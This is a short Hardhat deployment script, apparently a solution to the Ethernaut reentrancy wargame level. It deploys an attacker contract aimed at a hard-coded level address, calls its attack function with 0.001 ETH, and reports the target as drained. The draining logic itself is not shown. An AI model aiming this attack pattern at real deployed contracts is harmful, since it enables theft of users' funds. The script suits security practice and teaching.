const hre = require('hardhat');

async function main() {
  const INITIAL_ETH = ethers.utils.parseEther('0.001');
  // Ethernaut level
  const reentranceContract = '0xFb6c62946134e7D7e19fc0e2271dCD22f38a0374';
  const [deployer] = await ethers.getSigners();

  console.log('Deploying contracts with the account:', deployer.address);
  console.log('Account balance:', (await deployer.getBalance()).toString());

  const ReentranceSolution = await ethers.getContractFactory('ReentranceSolution', deployer);
  const reentranceSolution = await ReentranceSolution.deploy(reentranceContract);

  const tx = await reentranceSolution.attack({ value: INITIAL_ETH });
  await tx.wait();

  console.log('Reentrance drained');
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
